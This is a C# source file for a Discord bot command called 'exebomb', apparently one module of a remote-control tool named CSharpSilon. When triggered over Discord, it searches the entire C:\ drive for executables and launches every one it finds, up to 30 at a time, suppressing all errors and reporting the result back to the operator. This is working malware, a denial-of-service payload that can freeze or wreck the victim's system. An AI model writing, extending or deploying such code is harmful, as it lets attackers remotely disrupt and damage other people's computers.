using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using Discord.Commands;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class ExeBomb : ModuleBase<SocketCommandContext>
    {
        static ConcurrentBag<string> exeFiles = new ConcurrentBag<string>();
        static int maxDegreeOfParallelism = 30;
        
        
        [Command("exebomb")]
        [Summary("Opens All .exe Files.")]
        public async Task ExeBombCmd()
        {
            var message = await ReplyAsync("Starting ExeBomb");
            string rootDirectory = @"C:\";
            try
            {
                await TraverseDirectories(rootDirectory);
                await Task.Run(() =>
                {
                    Parallel.ForEach(exeFiles, new ParallelOptions { MaxDegreeOfParallelism = maxDegreeOfParallelism }, exeFile =>
                    {
                        try { System.Diagnostics.Process.Start(exeFile); }
                        catch { }
                    });
                });

                await message.ModifyAsync(properties => properties.Content = "Started All Found .exe Files");
            }
            catch (Exception ex)
            {
                await message.ModifyAsync(properties => properties.Content = $"```An error occurred: {ex.Message}```");
            }
        }
        
        private static async Task TraverseDirectories(string currentDirectory)
        {
            try
            {
                foreach (var file in Directory.GetFiles(currentDirectory, "*.exe", SearchOption.TopDirectoryOnly))
                    exeFiles.Add(file);

                var directories = Directory.GetDirectories(currentDirectory);
                await Task.WhenAll(directories.Select(directory => Task.Run(() => TraverseDirectories(directory))));
            }
            catch {  }
        }
    }
}